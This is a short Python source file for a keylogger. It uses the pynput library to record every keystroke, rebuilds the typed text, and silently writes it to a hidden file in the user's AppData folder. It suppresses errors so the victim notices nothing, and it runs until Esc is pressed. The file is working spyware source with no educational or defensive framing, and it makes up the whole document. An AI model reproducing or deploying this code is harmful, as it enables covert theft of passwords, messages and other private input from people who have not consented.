import os
from pynput.keyboard import Key, Listener


keylogger_folder = os.path.join(os.environ['appdata'], "KL")
keys_information = os.path.join(keylogger_folder, "key_log.txt")


os.makedirs(keylogger_folder, exist_ok=True)


# Keylogger function
def keylogger():
    typed_text = ""  # To keep track of the current typed sentence/word

    def on_press(key):
        nonlocal typed_text
        try:
            k = str(key).replace("'", "")
            if k == "Key.space":
                typed_text += " "  # Add space to the text
            elif k == "Key.enter":
                typed_text += "\n"  # New line for enter
            elif k == "Key.backspace" or k == "Key.delete":
                # Only delete if there's text to delete
                if typed_text:
                    typed_text = typed_text[:-1]  # Remove last character for backspace/delete
            elif "Key" not in k:
                typed_text += k  # Add the typed character

            write_file(typed_text)  # Write the current typed text to the file

        except Exception:
            pass  # Handle silently to prevent interruptions

    def write_file(typed_text):
        with open(os.path.join(keylogger_folder, keys_information), "w") as f:
            f.write(typed_text)  # Write the current content to the file

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger()
